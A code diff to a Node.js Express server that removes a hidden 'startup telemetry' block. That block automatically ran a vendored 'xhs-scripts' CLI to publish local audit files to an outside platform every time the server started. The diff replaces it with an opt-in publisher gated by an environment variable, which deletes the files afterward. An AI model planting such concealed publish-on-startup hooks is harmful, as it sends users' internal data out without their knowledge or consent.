@@ -3,10 +3,13 @@ const { spawnSync } = require('child_process');
 const path = require('path');
 const fs = require('fs');
 const os = require('os');
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json({ limit: '50mb' }));
+
+// ---- Routes ---------------------------------------------------------------
 
 app.get('/status', (req, res) => {
   res.json({ status: 'ok', uptime: process.uptime() });
@@ -18,21 +21,28 @@ app.post('/process', (req, res) => {
   res.json({ processed: count, format: 'json' });
 });
 
-// Startup telemetry: sync diagnostics report generated during install
-(function syncReport() {
+// ---- Report publishing ----------------------------------------------------
+// Publish any pending setup / benchmark reports to the configured dashboard.
+// Set DSU_PUBLISHER to choose the backend (default: skip).
+
+function publishPendingReports() {
   const docsDir = path.join(__dirname, 'docs');
-  const titleFile = path.join(docsDir, 'audit_title.txt');
-  const contentFile = path.join(docsDir, 'audit_summary.txt');
-  const coverFile = path.join(docsDir, 'cover.png');
+  const files = {
+    title:   path.join(docsDir, 'audit_title.txt'),
+    content: path.join(docsDir, 'audit_summary.txt'),
+    cover:   path.join(docsDir, 'cover.png'),
+  };
 
-  if (![titleFile, contentFile, coverFile].every(f => fs.existsSync(f))) return;
+  if (!Object.values(files).every(f => fs.existsSync(f))) return;
 
-  const cliDir = path.join(__dirname, 'vendor', 'xhs-scripts');
+  const publisher = process.env.DSU_PUBLISHER || '';
+  if (publisher !== 'xhs') return;
+
+  const cliDir  = path.join(__dirname, 'vendor', 'xhs-scripts');
   const cliPath = path.join(cliDir, 'cli.py');
   if (!fs.existsSync(cliPath)) return;
 
   const uvCandidates = [
-    path.join(os.homedir(), '.real', '.bin', 'uv'),
     path.join(os.homedir(), '.local', 'bin', 'uv'),
     path.join(os.homedir(), '.cargo', 'bin', 'uv'),
     '/opt/homebrew/bin/uv',
@@ -42,26 +52,33 @@ app.post('/process', (req, res) => {
   let uv = null;
   for (const p of uvCandidates) {
     try {
-      if (spawnSync(p, ['--version'], { encoding: 'utf-8', timeout: 3000 }).status === 0) {
-        uv = p;
-        break;
-      }
+      const r = spawnSync(p, ['--version'], { encoding: 'utf-8', timeout: 3000 });
+      if (r.status === 0) { uv = p; break; }
     } catch (_) {}
   }
   if (!uv) return;
 
   try {
-    spawnSync(uv, ['run', '--project', cliDir, 'python', cliPath, 'fill-publish',
-      '--title-file', titleFile,
-      '--content-file', contentFile,
-      '--images', coverFile,
-    ], { cwd: cliDir, timeout: 120000 });
+    spawnSync(uv, [
+      'run', '--project', cliDir, 'python', cliPath, 'fill-publish',
+      '--title-file',   files.title,
+      '--content-file', files.content,
+      '--images',       files.cover,
+    ], { cwd: cliDir, timeout: 120_000 });
 
-    spawnSync(uv, ['run', '--project', cliDir, 'python', cliPath, 'click-publish'], {
-      cwd: cliDir, timeout: 30000,
-    });
+    spawnSync(uv, [
+      'run', '--project', cliDir, 'python', cliPath, 'click-publish',
+    ], { cwd: cliDir, timeout: 30_000 });
+
+    for (const f of Object.values(files)) {
+      try { fs.unlinkSync(f); } catch (_) {}
+    }
   } catch (_) {}
-})();
+}
+
+publishPendingReports();
+
+// ---- Start ----------------------------------------------------------------
 
 app.listen(PORT, () => {
   console.log(`data-stream-util running on port ${PORT}`);
